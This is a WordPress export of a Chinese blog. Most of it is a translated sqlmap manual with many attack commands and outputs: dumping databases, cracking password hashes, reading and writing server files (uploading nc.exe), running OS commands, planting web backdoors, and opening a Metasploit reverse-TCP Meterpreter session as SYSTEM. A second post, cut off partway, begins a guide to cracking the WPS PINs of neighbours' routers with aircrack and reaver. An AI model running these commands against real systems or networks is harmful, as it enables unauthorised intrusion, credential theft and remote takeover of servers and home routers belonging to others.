默认情况下sqlmap通过判断返回页面的不同来判断真假，但有时候这会产生误差，因为有的页面在每次刷新的时候都会返回不同的代码，比如页面当中包含一个动态的广告或者其他内容，这会导致sqlmap的误判。此时用户可以提供一个字符串或者一段正则匹配，在原始页面与真条件下的页面都存在的字符串，而错误页面中不存在（使用--string参数添加字符串，--regexp添加正则），同时用户可以提供一段字符串在原始页面与真条件下的页面都不存在的字符串，而错误页面中存在的字符串（--not-string添加）。用户也可以提供真与假条件返回的HTTP状态码不一样来注入，例如，响应200的时候为真，响应401的时候为假，可以添加参数--code=200。
参数：--text-only,--titles
有些时候用户知道真条件下的返回页面与假条件下返回页面是不同位置在哪里可以使用--text-only（HTTP响应体中不同）--titles（HTML的title标签中不同）。

<h2>注入技术</h2>

<hr />

<h3>测试是否是注入</h3>

参数：--technique
这个参数可以指定sqlmap使用的探测技术，默认情况下会测试所有的方式。
支持的探测方式如下：

<pre class="highlight">B: Boolean-based blind SQL injection（布尔型注入）
E: Error-based SQL injection（报错型注入）
U: UNION query SQL injection（可联合查询注入）
S: Stacked queries SQL injection（可多语句查询注入）
T: Time-based blind SQL injection（基于时间延迟注入）
</pre>

<h3>设定延迟注入的时间</h3>

参数：--time-sec
当使用继续时间的盲注时，时刻使用--time-sec参数设定延时时间，默认是5秒。

<h3>设定UNION查询字段数</h3>

参数：--union-cols
默认情况下sqlmap测试UNION查询注入会测试1-10个字段数，当--level为5的时候他会增加测试到50个字段数。设定--union-cols的值应该是一段整数，如：12-16，是测试12-16个字段数。

<h3>设定UNION查询使用的字符</h3>

参数：--union-char
默认情况下sqlmap针对UNION查询的注入会使用NULL字符，但是有些情况下会造成页面返回失败，而一个随机整数是成功的，这是你可以用--union-char只定UNION查询的字符。

<h3>二阶SQL注入</h3>

参数：--second-order
有些时候注入点输入的数据看返回结果的时候并不是当前的页面，而是另外的一个页面，这时候就需要你指定到哪个页面获取响应判断真假。--second-order后面跟一个判断页面的URL地址。

<h2>列数据</h2>

<hr />

<h3>标志</h3>

参数：-b,--banner
大多数的数据库系统都有一个函数可以返回数据库的版本号，通常这个函数是version()或者变量@@version这主要取决与是什么数据库。

<h3>用户</h3>

参数：-current-user
在大多数据库中可以获取到管理数据的用户。

<h3>当前数据库</h3>

参数：--current-db
返还当前连接的数据库。

<h3>当前用户是否为管理用</h3>

参数：--is-dba
判断当前的用户是否为管理，是的话会返回True。

<h3>列数据库管理用户</h3>

参数：--users
当前用户有权限读取包含所有用户的表的权限时，就可以列出所有管理用户。

<h3>列出并破解数据库用户的hash</h3>

参数：--passwords
当前用户有权限读取包含用户密码的彪的权限时，sqlmap会现列举出用户，然后列出hash，并尝试破解。
例子：

<pre class="highlight">$ python sqlmap.py -u "http://192.168.136.131/sqlmap/pgsql/get_int.php?id=1" --passwords -v 1
[...]
back-end DBMS: PostgreSQL
[hh:mm:38] [INFO] fetching database users password hashes
do you want to use dictionary attack on retrieved password hashes? [Y/n/q] y
[hh:mm:42] [INFO] using hash method: 'postgres_passwd'
what's the dictionary's location? [/software/sqlmap/txt/wordlist.txt]
[hh:mm:46] [INFO] loading dictionary from: '/software/sqlmap/txt/wordlist.txt'
do you want to use common password suffixes? (slow!) [y/N] n
[hh:mm:48] [INFO] starting dictionary attack (postgres_passwd)
[hh:mm:49] [INFO] found: 'testpass' for user: 'testuser'
[hh:mm:50] [INFO] found: 'testpass' for user: 'postgres'
database management system users password hashes:
[*] postgres [1]:
    password hash: md5d7d880f96044b72d0bba108ace96d1e4
    clear-text password: testpass
[*] testuser [1]:
    password hash: md599e5ea7a6f7c3269995cba3927fd0093
    clear-text password: testpass
</pre>

可以看到sqlmap不仅勒出数据库的用户跟密码，同时也识别出是PostgreSQL数据库，并询问用户是否采用字典爆破的方式进行破解，这个爆破已经支持Oracle和Microsoft SQL Server。
也可以提供-U参数来指定爆破哪个用户的hash。

<h3>列出数据库管理员权限</h3>

参数：--privileges
当前用户有权限读取包含所有用户的表的权限时，很可能列举出每个用户的权限，sqlmap将会告诉你哪个是数据库的超级管理员。也可以用-U参数指定你想看哪个用户的权限。

<h3>列出数据库管理员角色</h3>

参数：--roles
当前用户有权限读取包含所有用户的表的权限时，很可能列举出每个用户的角色，也可以用-U参数指定你想看哪个用户的角色。
仅适用于当前数据库是Oracle的时候。

<h3>列出数据库系统的数据库</h3>

参数：--dbs
当前用户有权限读取包含所有数据库列表信息的表中的时候，即可列出所有的数据库。

<h3>列举数据库表</h3>

参数：--tables,--exclude-sysdbs,-D
当前用户有权限读取包含所有数据库表信息的表中的时候，即可列出一个特定数据的所有表。
如果你不提供-D参数来列指定的一个数据的时候，sqlmap会列出数据库所有库的所有表。
--exclude-sysdbs参数是指包含了所有的系统数据库。
需要注意的是在Oracle中你需要提供的是TABLESPACE_NAME而不是数据库名称。

<h3>列举数据库表中的字段</h3>

参数：--columns,-C,-T,-D
当前用户有权限读取包含所有数据库表信息的表中的时候，即可列出指定数据库表中的字段，同时也会列出字段的数据类型。
如果没有使用-D参数指定数据库时，默认会使用当前数据库。
列举一个SQLite的例子：

<pre class="highlight">$ python sqlmap.py -u "http://192.168.136.131/sqlmap/sqlite/get_int.php?id=1" --columns -D testdb -T users -C name
[...]
Database: SQLite_masterdb
Table: users
[3 columns]
+---------+---------+
| Column  | Type    |
+---------+---------+
| id      | INTEGER |
| name    | TEXT    |
| surname | TEXT    |
+---------+---------+
</pre>

<h3>列举数据库系统的架构</h3>

参数：--schema,--exclude-sysdbs
用户可以用此参数获取数据库的架构，包含所有的数据库，表和字段，以及各自的类型。
加上--exclude-sysdbs参数，将不会获取数据库自带的系统库内容。
MySQL例子：

<pre class="highlight">$ python sqlmap.py -u "http://192.168.48.130/sqlmap/mysql/get_int.php?id=1" --schema --batch --exclude-sysdbs
[...]
Database: owasp10
Table: accounts
[4 columns]
+-------------+---------+
| Column      | Type    |
+-------------+---------+
| cid         | int(11) |
| mysignature | text    |
| password    | text    |
| username    | text    |
+-------------+---------+
Database: owasp10
Table: blogs_table
[4 columns]
+--------------+----------+
| Column       | Type     |
+--------------+----------+
| date         | datetime |
| blogger_name | text     |
| cid          | int(11)  |
| comment      | text     |
+--------------+----------+
Database: owasp10
Table: hitlog
[6 columns]
+----------+----------+
| Column   | Type     |
+----------+----------+
| date     | datetime |
| browser  | text     |
| cid      | int(11)  |
| hostname | text     |
| ip       | text     |
| referer  | text     |
+----------+----------+
Database: testdb
Table: users
[3 columns]
+---------+---------------+
| Column  | Type          |
+---------+---------------+
| id      | int(11)       |
| name    | varchar(500)  |
| surname | varchar(1000) |
+---------+---------------+
[...]
</pre>

<h3>获取表中数据个数</h3>

参数：--count
有时候用户只想获取表中的数据个数而不是具体的内容，那么就可以使用这个参数。
列举一个Microsoft SQL Server例子：

<pre class="highlight">$ python sqlmap.py -u "http://192.168.21.129/sqlmap/mssql/iis/get_int.asp?id=1" --count -D testdb
[...]
Database: testdb
+----------------+---------+
| Table          | Entries |
+----------------+---------+
| dbo.users      | 4       |
| dbo.users_blob | 2       |
+----------------+---------+
</pre>

<h3>获取整个表的数据</h3>

参数：--dump,-C,-T,-D,--start,--stop,--first,--last
如果当前管理员有权限读取数据库其中的一个表的话，那么就能获取真个表的所有内容。
使用-D,-T参数指定想要获取哪个库的哪个表，不适用-D参数时，默认使用当前库。
列举一个Firebird的例子：

<pre class="highlight">$ python sqlmap.py -u "http://192.168.136.131/sqlmap/firebird/get_int.php?id=1" --dump -T users
[...]
Database: Firebird_masterdb
Table: USERS
[4 entries]
+----+--------+------------+
| ID | NAME   | SURNAME    |
+----+--------+------------+
| 1  | luther | blisset    |
| 2  | fluffy | bunny      |
| 3  | wu     | ming       |
| 4  | NULL   | nameisnull |
+----+--------+------------+
</pre>

可以获取指定库中的所有表的内容，只用-dump跟-D参数（不使用-T与-C参数）。
也可以用-dump跟-C获取指定的字段内容。
sqlmap为每个表生成了一个CSV文件。
如果你只想获取一段数据，可以使用--start和--stop参数，例如，你只想获取第一段数据可hi使用--stop 1，如果想获取第二段与第三段数据，使用参数 --start 1 --stop 3。
也可以用--first与--last参数，获取第几个字符到第几个字符的内容，如果你想获取字段中地三个字符到第五个字符的内容，使用--first 3 --last 5，只在盲注的时候使用，因为其他方式可以准确的获取注入内容，不需要一个字符一个字符的猜解。

<h3>获取所有数据库表的内容</h3>

参数：--dump-all,--exclude-sysdbs
使用--dump-all参数获取所有数据库表的内容，可同时加上--exclude-sysdbs只获取用户数据库的表，需要注意在Microsoft SQL Server中master数据库没有考虑成为一个系统数据库，因为有的管理员会把他当初用户数据库一样来使用它。

<h3>搜索字段，表，数据库</h3>

参数：--search,-C,-T,-D
--search可以用来寻找特定的数据库名，所有数据库中的特定表名，所有数据库表中的特定字段。
可以在一下三种情况下使用：

<pre class="highlight">-C后跟着用逗号分割的列名，将会在所有数据库表中搜索指定的列名。
-T后跟着用逗号分割的表名，将会在所有数据库中搜索指定的表名
-D后跟着用逗号分割的库名，将会在所有数据库中搜索指定的库名。
</pre>

<h3>运行自定义的SQL语句</h3>

参数：--sql-query,--sql-shell
sqlmap会自动检测确定使用哪种SQL注入技术，如何插入检索语句。
如果是SELECT查询语句，sqlap将会输出结果。如果是通过SQL注入执行其他语句，需要测试是否支持多语句执行SQL语句。
列举一个Mircrosoft SQL Server 2000的例子：

<pre class="highlight">$ python sqlmap.py -u "http://192.168.136.131/sqlmap/mssql/get_int.php?id=1" --sql-query "SELECT 'foo'" -v 1
[...]
[hh:mm:14] [INFO] fetching SQL SELECT query output: 'SELECT 'foo''
[hh:mm:14] [INFO] retrieved: foo
SELECT 'foo':    'foo'
$ python sqlmap.py -u "http://192.168.136.131/sqlmap/mssql/get_int.php?id=1" --sql-query "SELECT 'foo', 'bar'" -v 2
[...]
[hh:mm:50] [INFO] fetching SQL SELECT query output: 'SELECT 'foo', 'bar''
[hh:mm:50] [INFO] the SQL query provided has more than a field. sqlmap will now unpack it into
distinct queries to be able to retrieve the output even if we are going blind
[hh:mm:50] [DEBUG] query: SELECT ISNULL(CAST((CHAR(102)+CHAR(111)+CHAR(111)) AS VARCHAR(8000)),
(CHAR(32)))
[hh:mm:50] [INFO] retrieved: foo
[hh:mm:50] [DEBUG] performed 27 queries in 0 seconds
[hh:mm:50] [DEBUG] query: SELECT ISNULL(CAST((CHAR(98)+CHAR(97)+CHAR(114)) AS VARCHAR(8000)),
(CHAR(32)))
[hh:mm:50] [INFO] retrieved: bar
[hh:mm:50] [DEBUG] performed 27 queries in 0 seconds
SELECT 'foo', 'bar':    'foo, bar'
</pre>

<h2>爆破</h2>

<hr />

<h3>暴力破解表名</h3>

参数：--common-tables
当使用--tables无法获取到数据库的表时，可以使用此参数。
通常是如下情况：

<pre class="highlight">1、MySQL数据库版本小于5.0，没有information_schema表。
2、数据库是Microssoft Access，系统表MSysObjects是不可读的（默认）。
3、当前用户没有权限读取系统中保存数据结构的表的权限。
</pre>

暴力破解的表在txt/common-tables.txt文件中，你可以自己添加。
列举一个MySQL 4.1的例子：

<pre class="highlight">$ python sqlmap.py -u "http://192.168.136.129/mysql/get_int_4.php?id=1" --common-tables -D testdb --banner
[...]
[hh:mm:39] [INFO] testing MySQL
[hh:mm:39] [INFO] confirming MySQL
[hh:mm:40] [INFO] the back-end DBMS is MySQL
[hh:mm:40] [INFO] fetching banner
web server operating system: Windows
web application technology: PHP 5.3.1, Apache 2.2.14
back-end DBMS operating system: Windows
back-end DBMS: MySQL &amp;lt; 5.0.0
banner:    '4.1.21-community-nt'
[hh:mm:40] [INFO] checking table existence using items from '/software/sqlmap/txt/common-tables.txt'
[hh:mm:40] [INFO] adding words used on web page to the check list
please enter number of threads? [Enter for 1 (current)] 8
[hh:mm:43] [INFO] retrieved: users
Database: testdb
[1 table]
+-------+
| users |
+-------+
</pre>

<h3>暴力破解列名</h3>

参数：--common-columns
与暴力破解表名一样，暴力跑的列名在txt/common-columns.txt中。

<h2>用户自定义函数注入</h2>

<hr />

参数：--udf-inject,--shared-lib
你可以通过编译MySQL注入你自定义的函数（UDFs）或PostgreSQL在windows中共享库，DLL，或者Linux/Unix中共享对象，sqlmap将会问你一些问题，上传到服务器数据库自定义函数，然后根据你的选择执行他们，当你注入完成后，sqlmap将会移除它们。

<h2>系统文件操作</h2>

<hr />

<h3>从数据库服务器中读取文件</h3>

参数：--file-read
当数据库为MySQL，PostgreSQL或Microsoft SQL Server，并且当前用户有权限使用特定的函数。读取的文件可以是文本也可以是二进制文件。
列举一个Microsoft SQL Server 2005的例子：

<pre class="highlight">$ python sqlmap.py -u "http://192.168.136.129/sqlmap/mssql/iis/get_str2.asp?name=luther" \
--file-read "C:/example.exe" -v 1
[...]
[hh:mm:49] [INFO] the back-end DBMS is Microsoft SQL Server
web server operating system: Windows 2000
web application technology: ASP.NET, Microsoft IIS 6.0, ASP
back-end DBMS: Microsoft SQL Server 2005
[hh:mm:50] [INFO] fetching file: 'C:/example.exe'
[hh:mm:50] [INFO] the SQL query provided returns 3 entries
C:/example.exe file saved to:    '/software/sqlmap/output/192.168.136.129/files/C__example.exe'
[...]
$ ls -l output/192.168.136.129/files/C__example.exe
-rw-r--r-- 1 inquis inquis 2560 2011-MM-DD hh:mm output/192.168.136.129/files/C__example.exe
$ file output/192.168.136.129/files/C__example.exe
output/192.168.136.129/files/C__example.exe: PE32 executable for MS Windows (GUI) Intel
80386 32-bit
</pre>

<h3>把文件上传到数据库服务器中</h3>

参数：--file-write,--file-dest
当数据库为MySQL，PostgreSQL或Microsoft SQL Server，并且当前用户有权限使用特定的函数。上传的文件可以是文本也可以是二进制文件。
列举一个MySQL的例子：

<pre class="highlight">$ file /software/nc.exe.packed
/software/nc.exe.packed: PE32 executable for MS Windows (console) Intel 80386 32-bit
$ ls -l /software/nc.exe.packed
-rwxr-xr-x 1 inquis inquis 31744 2009-MM-DD hh:mm /software/nc.exe.packed
$ python sqlmap.py -u "http://192.168.136.129/sqlmap/mysql/get_int.aspx?id=1" --file-write \
"/software/nc.exe.packed" --file-dest "C:/WINDOWS/Temp/nc.exe" -v 1
[...]
[hh:mm:29] [INFO] the back-end DBMS is MySQL
web server operating system: Windows 2003 or 2008
web application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727
back-end DBMS: MySQL &amp;gt;= 5.0.0
[...]
do you want confirmation that the file 'C:/WINDOWS/Temp/nc.exe' has been successfully
written on the back-end DBMS file system? [Y/n] y
[hh:mm:52] [INFO] retrieved: 31744
[hh:mm:52] [INFO] the file has been successfully written and its size is 31744 bytes,
same size as the local file '/software/nc.exe.packed'
</pre>

<h3>运行任意操作系统命令</h3>

参数：--os-cmd,--os-shell
当数据库为MySQL，PostgreSQL或Microsoft SQL Server，并且当前用户有权限使用特定的函数。
在MySQL、PostgreSQL，sqlmap上传一个二进制库，包含用户自定义的函数，sys_exec()和sys_eval()。
那么他创建的这两个函数可以执行系统命令。在Microsoft SQL Server，sqlmap将会使用xp_cmdshell存储过程，如果被禁（在Microsoft SQL Server 2005及以上版本默认禁制），sqlmap会重新启用它，如果不存在，会自动创建。
列举一个PostgreSQL的例子：

<pre class="highlight">$ python sqlmap.py -u "http://192.168.136.131/sqlmap/pgsql/get_int.php?id=1" \
--os-cmd id -v 1
[...]
web application technology: PHP 5.2.6, Apache 2.2.9
back-end DBMS: PostgreSQL
[hh:mm:12] [INFO] fingerprinting the back-end DBMS operating system
[hh:mm:12] [INFO] the back-end DBMS operating system is Linux
[hh:mm:12] [INFO] testing if current user is DBA
[hh:mm:12] [INFO] detecting back-end DBMS version from its banner
[hh:mm:12] [INFO] checking if UDF 'sys_eval' already exist
[hh:mm:12] [INFO] checking if UDF 'sys_exec' already exist
[hh:mm:12] [INFO] creating UDF 'sys_eval' from the binary UDF file
[hh:mm:12] [INFO] creating UDF 'sys_exec' from the binary UDF file
do you want to retrieve the command standard output? [Y/n/a] y
command standard output:    'uid=104(postgres) gid=106(postgres) groups=106(postgres)'
[hh:mm:19] [INFO] cleaning up the database management system
do you want to remove UDF 'sys_eval'? [Y/n] y
do you want to remove UDF 'sys_exec'? [Y/n] y
[hh:mm:23] [INFO] database management system cleanup finished
[hh:mm:23] [WARNING] remember that UDF shared object files saved on the file system can
only be deleted manually
</pre>

用--os-shell参数也可以模拟一个真实的shell，可以输入你想执行的命令。
当不能执行多语句的时候（比如php或者asp的后端数据库为MySQL时），仍然可能使用INTO OUTFILE写进可写目录，来创建一个web后门。支持的语言：

<pre class="highlight">1、ASP
2、ASP.NET
3、JSP
4、PHP
</pre>

<h3>Meterpreter配合使用</h3>

参数：--os-pwn,--os-smbrelay,--os-bof,--priv-esc,--msf-path,--tmp-path
当数据库为MySQL，PostgreSQL或Microsoft SQL Server，并且当前用户有权限使用特定的函数，可以在数据库与攻击者直接建立TCP连接，这个连接可以是一个交互式命令行的Meterpreter会话，sqlmap根据Metasploit生成shellcode，并有四种方式执行它：

<pre class="highlight">1、通过用户自定义的sys_bineval()函数在内存中执行Metasplit的shellcode，支持MySQL和PostgreSQL数据库，参数：--os-pwn。
2、通过用户自定义的函数上传一个独立的payload执行，MySQL和PostgreSQL的sys_exec()函数，Microsoft SQL Server的xp_cmdshell()函数，参数：--os-pwn。
3、通过SMB攻击(MS08-068)来执行Metasploit的shellcode，当sqlmap获取到的权限足够高的时候（Linux/Unix的uid=0，Windows是Administrator），--os-smbrelay。
4、通过溢出Microsoft SQL Server 2000和2005的sp_replwritetovarbin存储过程(MS09-004)，在内存中执行Metasploit的payload，参数：--os-bof
</pre>

列举一个MySQL例子：

<pre class="highlight">$ python sqlmap.py -u "http://192.168.136.129/sqlmap/mysql/iis/get_int_55.aspx?id=1" --os-pwn --msf-path /software/metasploit
[...]
[hh:mm:31] [INFO] the back-end DBMS is MySQL
web server operating system: Windows 2003
web application technology: ASP.NET, ASP.NET 4.0.30319, Microsoft IIS 6.0
back-end DBMS: MySQL 5.0
[hh:mm:31] [INFO] fingerprinting the back-end DBMS operating system
[hh:mm:31] [INFO] the back-end DBMS operating system is Windows
how do you want to establish the tunnel?
[1] TCP: Metasploit Framework (default)
[2] ICMP: icmpsh - ICMP tunneling
&amp;gt;
[hh:mm:32] [INFO] testing if current user is DBA
[hh:mm:32] [INFO] fetching current user
what is the back-end database management system architecture?
[1] 32-bit (default)
[2] 64-bit
&amp;gt;
[hh:mm:33] [INFO] checking if UDF 'sys_bineval' already exist
[hh:mm:33] [INFO] checking if UDF 'sys_exec' already exist
[hh:mm:33] [INFO] detecting back-end DBMS version from its banner
[hh:mm:33] [INFO] retrieving MySQL base directory absolute path
[hh:mm:34] [INFO] creating UDF 'sys_bineval' from the binary UDF file
[hh:mm:34] [INFO] creating UDF 'sys_exec' from the binary UDF file
how do you want to execute the Metasploit shellcode on the back-end database underlying
operating system?
[1] Via UDF 'sys_bineval' (in-memory way, anti-forensics, default)
[2] Stand-alone payload stager (file system way)
&amp;gt;
[hh:mm:35] [INFO] creating Metasploit Framework multi-stage shellcode
which connection type do you want to use?
[1] Reverse TCP: Connect back from the database host to this machine (default)
[2] Reverse TCP: Try to connect back from the database host to this machine, on all ports
between the specified and 65535
[3] Bind TCP: Listen on the database host for a connection
&amp;gt;
which is the local address? [192.168.136.1]
which local port number do you want to use? [60641]
which payload do you want to use?
[1] Meterpreter (default)
[2] Shell
[3] VNC
&amp;gt;
[hh:mm:40] [INFO] creation in progress ... done
[hh:mm:43] [INFO] running Metasploit Framework command line interface locally, please wait..
                                _
                                | |      o
_  _  _    _ _|_  __,   ,    _  | |  __    _|_
/ |/ |/ |  |/  |  /  |  / \_|/ \_|/  /  \_|  |
|  |  |_/|__/|_/\_/|_/ \/ |__/ |__/\__/ |_/|_/
                        /|
                        \|
    =[ metasploit v3.7.0-dev [core:3.7 api:1.0]
+ -- --=[ 674 exploits - 351 auxiliary
+ -- --=[ 217 payloads - 27 encoders - 8 nops
    =[ svn r12272 updated 4 days ago (2011.04.07)
PAYLOAD =&amp;gt; windows/meterpreter/reverse_tcp
EXITFUNC =&amp;gt; thread
LPORT =&amp;gt; 60641
LHOST =&amp;gt; 192.168.136.1
[*] Started reverse handler on 192.168.136.1:60641
[*] Starting the payload handler...
[hh:mm:48] [INFO] running Metasploit Framework shellcode remotely via UDF 'sys_bineval',
please wait..
[*] Sending stage (749056 bytes) to 192.168.136.129
[*] Meterpreter session 1 opened (192.168.136.1:60641 -&amp;gt; 192.168.136.129:1689) at Mon Apr 11
hh:mm:52 +0100 2011
meterpreter &amp;gt; Loading extension espia...success.
meterpreter &amp;gt; Loading extension incognito...success.
meterpreter &amp;gt; [-] The 'priv' extension has already been loaded.
meterpreter &amp;gt; Loading extension sniffer...success.
meterpreter &amp;gt; System Language : en_US
OS              : Windows .NET Server (Build 3790, Service Pack 2).
Computer        : W2K3R2
Architecture    : x86
Meterpreter     : x86/win32
meterpreter &amp;gt; Server username: NT AUTHORITY\SYSTEM
meterpreter &amp;gt; ipconfig
MS TCP Loopback interface
Hardware MAC: 00:00:00:00:00:00
IP Address  : 127.0.0.1
Netmask     : 255.0.0.0
Intel(R) PRO/1000 MT Network Connection
Hardware MAC: 00:0c:29:fc:79:39
IP Address  : 192.168.136.129
Netmask     : 255.255.255.0
meterpreter &amp;gt; exit
[*] Meterpreter session 1 closed.  Reason: User exit
</pre>

默认情况下MySQL在Windows上以SYSTEM权限运行，PostgreSQL在Windows与Linux中是低权限运行，Microsoft SQL Server 2000默认是以SYSTEM权限运行，Microsoft SQL Server 2005与2008大部分是以NETWORK SERVICE有时是LOCAL SERVICE。]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>69</wp:post_id>
		<wp:post_date><![CDATA[2015-10-12 16:36:39]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2015-10-12 08:36:39]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[sqlmap%e7%94%a8%e6%88%b7%e6%89%8b%e5%86%8c]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="sqlmap"><![CDATA[sqlmap]]></category>
		<category domain="post_tag" nicename="%e6%95%b0%e6%8d%ae%e5%ba%93"><![CDATA[数据库]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
		<category domain="category" nicename="%e7%bd%91%e7%bb%9c%e5%ae%89%e5%85%a8"><![CDATA[网络安全]]></category>
		<category domain="category" nicename="%e8%bd%af%e4%bb%b6%e5%ba%94%e7%94%a8"><![CDATA[软件应用]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[798]]></wp:meta_value>
		</wp:postmeta>
							<wp:comment>
			<wp:comment_id>4</wp:comment_id>
			<wp:comment_author><![CDATA[Mr9esx]]></wp:comment_author>
			<wp:comment_author_email><![CDATA[1138099359@qq.com]]></wp:comment_author_email>
			<wp:comment_author_url></wp:comment_author_url>
			<wp:comment_author_IP><![CDATA[113.104.33.134]]></wp:comment_author_IP>
			<wp:comment_date><![CDATA[2015-10-12 21:58:22]]></wp:comment_date>
			<wp:comment_date_gmt><![CDATA[2015-10-12 13:58:22]]></wp:comment_date_gmt>
			<wp:comment_content><![CDATA[:a5: 这玩意怎么用呀]]></wp:comment_content>
			<wp:comment_approved><![CDATA[1]]></wp:comment_approved>
			<wp:comment_type><![CDATA[]]></wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>1</wp:comment_user_id>
						<wp:commentmeta>
	<wp:meta_key><![CDATA[akismet_history]]></wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
			</wp:commentmeta>
							</wp:comment>
					<wp:comment>
			<wp:comment_id>5</wp:comment_id>
			<wp:comment_author><![CDATA[Mr9esx]]></wp:comment_author>
			<wp:comment_author_email><![CDATA[1138099359@qq.com]]></wp:comment_author_email>
			<wp:comment_author_url></wp:comment_author_url>
			<wp:comment_author_IP><![CDATA[113.104.33.212]]></wp:comment_author_IP>
			<wp:comment_date><![CDATA[2016-05-08 17:55:30]]></wp:comment_date>
			<wp:comment_date_gmt><![CDATA[2016-05-08 09:55:30]]></wp:comment_date_gmt>
			<wp:comment_content><![CDATA[测试测试]]></wp:comment_content>
			<wp:comment_approved><![CDATA[1]]></wp:comment_approved>
			<wp:comment_type><![CDATA[]]></wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>1</wp:comment_user_id>
							</wp:comment>
					</item>
					<item>
		<title>Raspberry Pi下跑aircrack和reaver破解路由器PIN码</title>
		<link>https://www.nervgeek.com/2015/10/13/raspberry-pi%e4%b8%8b%e8%b7%91aircrack%e5%92%8creaver%e7%a0%b4%e8%a7%a3%e8%b7%af%e7%94%b1%e5%99%a8pin%e7%a0%81/</link>
		<pubDate>Tue, 13 Oct 2015 01:17:57 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=74</guid>
		<description></description>
		<content:encoded><![CDATA[最近心血来潮，想把小区里的无线信号测试个遍。基于目前大多数路由器都支持wps,想必各位基友们都知道aircrack和reaver这两个工具，实属破解pin码，杀人越货，居家旅行之必备良药。像以前跑reaver这样的暴力工具一般都要24小时开着主机，实在浪费功耗，灰常的不绿色！不环保！
话说Raspberry Pi，作为一个攻击环境也是灰常给力的。国外的发烧友们已经针对这个板子，改造了专门用于网络攻击和测试的系统（基于debian）
<strong>不过今天这篇文章说的是如何在Raspberry Pi的官方发行版上安装 aircrack和reaver ，我用的是苹果充电器+Mini usb 数据线给Raspberry Pi供电，带一个alfa的无线网卡足够了。功耗如此之低，实在是在线跑pin码。长期无线抓包的绝佳方案呢。</strong>
<!--more-->
<strong>废话不多说，安装过程如下</strong>
1.准备系统环境

<pre class="prettyprint lang-bsh prettyprinted"><span class="pln">apt</span><span class="pun">-</span><span class="pln">get install </span><span class="pun">-</span><span class="pln">y libpcap</span><span class="pun">-</span><span class="pln">dev libsqlite3</span><span class="pun">-</span><span class="pln">dev sqlite3 libpcap0</span><span class="pun">.</span><span class="lit">8</span><span class="pun">-</span><span class="pln">dev libssl</span><span class="pun">-</span><span class="pln">dev build</span><span class="pun">-</span><span class="pln">essential iw tshark subversion</span></pre>

2.安装aircrack

<pre class="prettyprint lang-bsh prettyprinted"><span class="pln">svn co http</span><span class="pun">://</span><span class="pln">trac</span><span class="pun">.</span><span class="pln">aircrack</span><span class="pun">-</span><span class="pln">ng</span><span class="pun">.</span><span class="pln">org</span><span class="pun">/</span><span class="pln">svn</span><span class="pun">/</span><span class="pln">trunk aircrack</span><span class="pun">-</span><span class="pln">ng
cd aircrack</span><span class="pun">-</span><span class="pln">ng</span><span class="pun">/</span><span class="pln">
make
make install
cd </span><span class="pun">../</span></pre>

3.安装reaver

<pre class="prettyprint lang-bsh prettyprinted"><span class="pln">wget http</span><span class="pun">://</span><span class="pln">reaver</span><span class="pun">-</span><span class="pln">wps</span><span class="pun">.</span><span class="pln">googlecode</span><span class="pun">.</span><span class="pln">com</span><span class="pun">/</span><span class="pln">files</span><span class="pun">/</span><span class="pln">reaver</span><span class="pun">-</span><span class="lit">1.4</span><span class="pun">.</span><span class="pln">tar</span><span class="pun">.</span><span class="pln">gz
tar zxvf reaver</span><span class="pun">-</span><span class="lit">1.4</span><span class="pun">.</span><span class="pln">tar</span><span class="pun">.</span><span class="pln">gz
cd reaver</span><span class="pun">-</span><span class="lit">1.4</span><span class="pun">/</span><span class="pln">src
</span><span class="pun">./</span><span class="pln">configure
make
make install
cd </span><span class="pun">../</span></pre>

4.使用 aircrack，寻找附近开启wps的路由器，邪恶……嘻嘻

<pre class="prettyprint lang-bsh prettyprinted"><span class="pln">airmon</span><span class="pun">-</span><span class="pln">ng start wlan0
airodump</span><span class="pun">-</span><span class="pln">ng mon0</span></pre>

<pre class="prettyprint lang-html prettyprinted"><span class="pln">CH 11 ][ Elapsed: 36 s ][ 2012-12-18 04:46
 BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
 00:0E:2E:FD:C4:BB   -1        0        0    0  -1  -1                    &amp;lt;length:  0&amp;gt;
 4C:E6:76:60:3F:20  -13      123        0    0  11  54e  WPA2 CCMP   PSK  cuier-1
 B0:48:7A:52:F4:72  -23       42        0    0   1  54e. WPA2 CCMP   PSK  FAST_52F472
 8C:21:0A:5F:A2:FA  -35       28        0    0   1  54e. WPA2 CCMP   PSK  TP-LINK_5FA2FA
 E0:05:C5:D3:3F:00  -42       33        0    0   2  54e. WPA2 CCMP   PSK  TP-LINK_D33F00
 EC:17:2F:7D:12:1E  -49       56        1    0   6  54e. WPA2 CCMP   PSK  wg7788
